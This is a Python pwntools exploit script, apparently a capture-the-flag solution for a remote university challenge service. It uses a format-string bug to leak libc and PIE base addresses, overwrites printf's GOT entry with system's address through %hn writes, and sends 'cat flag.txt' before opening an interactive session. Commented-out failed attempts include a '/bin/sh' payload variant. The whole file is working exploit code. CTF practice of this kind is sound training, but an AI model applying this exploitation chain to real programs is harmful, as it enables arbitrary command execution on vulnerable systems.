from pwn import * 
import math

# p = process("./bin", env={"LD_PRELOAD": "./libc.so.6"})
# p = gdb.debug(
#     "./bin",
#     """
#     break main
#     continue
#     """,
#     env={"LD_PRELOAD": "./libc.so.6"}
#     )
p = remote('cyberchallenge.disi.unitn.it', 50231)

def little_to_big_endian(hex_str):
    # Split the string into pairs of two characters
    hex_pairs = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]
    # Reverse the list of pairs
    hex_pairs.reverse()
    # Join the reversed list back into a single string
    big_endian_str = ''.join(hex_pairs)
    return big_endian_str

elf = ELF("./bin")
libc = ELF("./libc.so.6")

context.binary = elf
#context(terminal=['tmux', 'splitw', '-h'])

printf_offset = libc.symbols["printf"]
system_offset = libc.symbols["system"]

p.sendlineafter(b'> ', b'%1$p')

libc_leak = p.recvuntil(b'> ').decode().split('\n')[0]
print(libc_leak + " libc leak")

libc_base = int(libc_leak, 16) - (0x7b25d55feb43 - 0x7b25d5400000) 
print(hex(libc_base)+ " libc base")
libc.address = libc_base

p.sendline(b'%19$p')
rbp_leak = p.recvuntil(b'> ').decode().split('\n')[0]
print(rbp_leak + " rbp leak")
pie_base = int(rbp_leak, 16) - 0x0000000000001159
print(hex(pie_base) + " pie base")
elf.address = pie_base

#printf_plt = pie_base + 0x1040
#printf_got = pie_base + 0x4008
fgets_got_address = elf.got['printf']
fgets_address = libc.symbols["printf"]
system_address = hex(libc.symbols["system"])
print(hex(fgets_got_address))
print(hex(fgets_address))
print(system_address)

#print(hex(printf_got) + " printf got", hex(elf.got['printf']) + " printf got 2")
#print(printf_address + " printf address", hex(libc.symbols["printf"]) + " printf offset")



# p.sendline(b'%7$s    ' + p64(int(printf_got_address,16)))
# printf_address = little_to_big_endian(p.recvuntil(b'> ').split(b' ')[0].hex())
# print(printf_address)

'''
Eight bytes of system not working
'''

printf_got_address = elf.got['printf']
print(hex(printf_got_address))

# system_pairs = [system_address[i:i+2] for i in range(0, len(system_address), 2)]
# eight_byte_system = int(''.join(system_pairs[-8:]), 16)
# print(eight_byte_system)
# eight_byte_system = eight_byte_system

# padding = 8 - ((7 + len(str(eight_byte_system))) % 8)
# padding_payload = f'%{eight_byte_system}X%9$ln{'A' * padding}'.encode()

# payload = padding_payload + p64(fgets_got_address)

# ------------------------------------------------------------

'''
Last 3bytes of fgets not working
'''
# system_pairs = [system_address[i:i+2] for i in range(0, len(system_address), 2)]
# last_two_bytes_system = int(''.join(system_pairs[-2:]), 16)
# third_last_byte_system = int(system_pairs[-3], 16)
# print(third_last_byte_system, last_two_bytes_system)
# last_two_bytes_system = last_two_bytes_system - third_last_byte_system - 8

# #character = 15 + len(str(last_two_bytes_system) + str(third_last_byte_system))
# #print(character)
# #pos = math.ceil((15 + len(str(last_two_bytes_system) + str(third_last_byte_system))) / 8)
# #print(pos)
# padding = 8 - ((15 + len(str(last_two_bytes_system)+str(third_last_byte_system-8))) % 8)
# #print(padding)
# padding_payload = f'/bin/sh %{third_last_byte_system}X%11$hhn%{last_two_bytes_system}X%12$hnAAAAAAA'.encode()
# payload = padding_payload + p64(fgets_got_address+2) + p64(fgets_got_address)

# ------------------------------------------------------------

system_pairs = [system_address[i:i+2] for i in range(0, len(system_address), 2)]
last_two_bytes_system = int(''.join(system_pairs[-2:]), 16)
last_two_bytes_system = last_two_bytes_system - 13
print(last_two_bytes_system)

padding = 8 - ((21 + len(str(last_two_bytes_system))) % 8)
padding_payload = f'cat flag.txt %{last_two_bytes_system}X%10$hn{'A'*padding}'.encode()
payload = padding_payload + p64(printf_got_address)

# with open("payload", "wb") as f:
#    f.write(payload)
print(padding_payload, len(padding_payload))
print(payload, len(payload))
p.sendline(payload)
#p.sendline(b'/bin/sh')

p.interactive()